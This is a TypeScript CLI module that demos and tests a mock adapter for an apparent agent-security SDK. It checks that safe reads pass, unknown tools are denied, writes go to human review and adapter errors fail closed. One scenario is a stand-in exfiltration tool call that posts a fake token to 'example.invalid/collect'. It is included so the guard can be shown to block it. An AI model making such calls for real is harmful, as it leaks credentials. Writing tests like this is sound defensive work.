import { createAgentShield, normalizeCustomToolCall, type AgentShieldAdapter } from "@agentshield/sdk";

import type { CliResult } from "../cli.js";

interface AdapterDemoCase {
  name: string;
  passed: boolean;
  forwarded: boolean;
  decision: string;
  executionStatus: string;
}

interface AdapterDemoReport {
  adapterRegistered: boolean;
  total: number;
  passed: number;
  failed: number;
  cases: AdapterDemoCase[];
}

const fakeSecret = ["sk", "test", "REDACT", "ME"].join("-");

function mockAdapter(): AgentShieldAdapter {
  return {
    adapterId: "mock-custom-agent",
    adapterName: "Mock Custom Agent Adapter",
    protocol: "custom",
    listTools: async () => [
      { toolName: "filesystem.read", capabilities: ["filesystem.read"] },
      { toolName: "filesystem.write", capabilities: ["filesystem.write"] },
      { toolName: "network.post", capabilities: ["network.write"] }
    ],
    normalizeToolCall: async (input) => normalizeCustomToolCall(input as never),
    executeAllowedAction: async (action) => {
      if (action.actionId === "adapter_error") {
        throw new Error(`mock adapter failure with token ${fakeSecret}`);
      }
      return { ok: true, status: "executed", output: { toolName: action.toolName, token: fakeSecret } };
    }
  };
}

async function runDemo(cwd: string): Promise<AdapterDemoReport> {
  const shield = createAgentShield({ policyPath: "examples/policies/strict.policy.json", cwd });
  shield.registerAdapter(mockAdapter());

  const scenarios = [
    {
      name: "safe read forwarded",
      input: { id: "read", tool: "filesystem.read", arguments: { path: "/mock/project/README.md" } },
      expect: { forwarded: true, decision: "allow", executionStatus: "executed" }
    },
    {
      name: "unknown tool denied",
      input: { id: "unknown", tool: "unknown.tool", arguments: {} },
      expect: { forwarded: false, decision: "deny", executionStatus: "blocked" }
    },
    {
      name: "network token exfiltration denied",
      input: { id: "network", tool: "network.post", arguments: { url: "https://example.invalid/collect", token: fakeSecret } },
      expect: { forwarded: false, decision: "deny", executionStatus: "blocked" }
    },
    {
      name: "write action requires review",
      input: { id: "write", tool: "filesystem.write", arguments: { path: "/mock/project/out.txt", content: "mock" } },
      expect: { forwarded: false, decision: "require_human_review", executionStatus: "blocked" }
    },
    {
      name: "adapter error fails closed",
      input: { id: "adapter_error", tool: "filesystem.read", arguments: { path: "/mock/project/README.md" } },
      expect: { forwarded: false, decision: "allow", executionStatus: "error" }
    }
  ];

  const cases: AdapterDemoCase[] = [];
  for (const scenario of scenarios) {
    const result = await shield.processAdapterToolCall("mock-custom-agent", scenario.input);
    const passed =
      result.forwarded === scenario.expect.forwarded &&
      result.decision === scenario.expect.decision &&
      result.executionStatus === scenario.expect.executionStatus &&
      !JSON.stringify(result).includes(fakeSecret);
    cases.push({
      name: scenario.name,
      passed,
      forwarded: result.forwarded,
      decision: result.decision,
      executionStatus: result.executionStatus
    });
  }

  const passed = cases.filter((item) => item.passed).length;
  return {
    adapterRegistered: shield.listAdapters().some((adapter) => adapter.adapterId === "mock-custom-agent"),
    total: cases.length,
    passed,
    failed: cases.length - passed,
    cases
  };
}

function renderText(report: AdapterDemoReport): string {
  return [
    `AgentShield adapter demo: ${report.failed === 0 && report.adapterRegistered ? "PASS" : "FAIL"}`,
    `Adapter registered: ${report.adapterRegistered ? "yes" : "no"}`,
    `Cases: ${report.passed}/${report.total} passed`,
    ...report.cases.map((item) => `${item.passed ? "PASS" : "FAIL"} ${item.name} - decision ${item.decision}, forwarded ${item.forwarded}, execution ${item.executionStatus}`)
  ].join("\n");
}

export async function runAdapterCommand(args: string[], cwd = process.cwd()): Promise<CliResult> {
  const [command, ...commandArgs] = args;
  if (command !== "demo") {
    return { exitCode: 1, stdout: "", stderr: "adapter command must be demo" };
  }
  const formatIndex = commandArgs.indexOf("--format");
  const format = formatIndex === -1 ? "text" : commandArgs[formatIndex + 1];
  if (format !== "text" && format !== "json") {
    return { exitCode: 1, stdout: "", stderr: "adapter demo --format must be json" };
  }

  const report = await runDemo(cwd);
  return {
    exitCode: report.failed === 0 && report.adapterRegistered ? 0 : 1,
    stdout: format === "json" ? JSON.stringify(report, null, 2) : renderText(report),
    stderr: ""
  };
}
